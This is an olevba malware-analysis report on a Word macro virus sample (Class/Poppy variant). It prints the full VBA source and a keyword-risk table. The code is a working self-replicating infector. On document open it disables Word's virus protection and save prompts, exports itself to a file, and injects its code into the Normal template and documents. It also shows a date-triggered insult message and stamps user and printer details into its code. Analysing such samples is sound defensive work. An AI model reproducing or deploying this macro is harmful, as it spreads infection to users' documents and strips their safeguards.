olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-db209e59106586ed82bfc6c7d5502d3d78ff3366
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-db209e59106586ed82bfc6c7d5502d3d78ff3366 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
On Error GoTo out
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
Options.VirusProtection = False
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
Options.SaveNormalPrompt = False
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
Options.ConfirmConversions = False
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If nt > 70 And ad > 0 Then GoTo out
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If nt < 70 Then
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End If
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
host.codemodule.AddFromFile ("c:\class.sys")
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
With host.codemodule
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    For x = 1 To 4
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    .deletelines 1
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    Next x
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End With
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If nt < 70 Then
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    With host.codemodule
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    .replaceline 1, "Sub AutoClose()"
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    .replaceline 71, "Sub ToolsMacro()"
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    End With
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End If
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
With host.codemodule
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    For x = 2 To 72 Step 2
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
    Next x
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End With
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
out:
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End Sub
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
Sub ViewVBCode()
'Monika Vrzalová9.2.1999 13:23:55Star XB24-200 on LPT2:dokument7 - Životopis: Monika Vrzalová IISvorka
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
